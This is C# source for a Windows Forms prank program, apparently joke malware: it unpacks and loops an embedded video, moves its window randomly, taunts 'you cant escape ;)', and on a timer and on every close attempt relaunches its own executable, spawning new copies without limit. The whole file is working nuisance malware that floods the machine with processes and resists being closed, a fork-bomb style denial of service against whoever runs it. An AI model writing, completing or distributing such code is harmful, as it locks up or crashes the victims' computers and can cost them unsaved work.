using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Reflection;
using System.IO;
using System.Threading;
using System.Diagnostics;

namespace memed
{
    public partial class Form1 : Form
    {
        static string loc = Application.ExecutablePath.ToString();
        static int height = Screen.PrimaryScreen.Bounds.Height;
        static int widht = Screen.PrimaryScreen.Bounds.Width;
        static string outpath = Path.GetTempPath() + "vid.mp4";
        public Form1()
        {
            
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                Assembly assembly = Assembly.GetExecutingAssembly();
                const string name = "memed.emb.vid.mp4";

                using (Stream stream = assembly.GetManifestResourceStream(name))
                {
                    using (BinaryReader r = new BinaryReader(stream))
                    {
                        using (FileStream fs = new FileStream(outpath, FileMode.Create))
                        {
                            using (BinaryWriter b = new BinaryWriter(fs))
                            {
                                b.Write(r.ReadBytes((int)stream.Length));
                            }
                        }
                    }
                }
            }catch
            {

            }
            this.axWindowsMediaPlayer1.URL = outpath;
            this.axWindowsMediaPlayer1.settings.autoStart = true;
            this.axWindowsMediaPlayer1.settings.setMode("loop", true);
        }

        private void axWindowsMediaPlayer1_Enter(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Process.Start(loc);
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            Random rnd = new Random();
            int widht1 = rnd.Next(1, widht);//x
            int height1 = rnd.Next(1, height);//y
            this.Location = new Point(widht1,height1);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Form1 f1 = new Form1();
            f1.ShowDialog();
            f1.ShowDialog();
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            timer3.Stop();
            Thread.Sleep(10000);
            MessageBox.Show("you cant escape ;)","hehehehehe",MessageBoxButtons.OK,MessageBoxIcon.Error);
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            Process.Start(loc);
            Process.Start(loc);
        }
    }
}
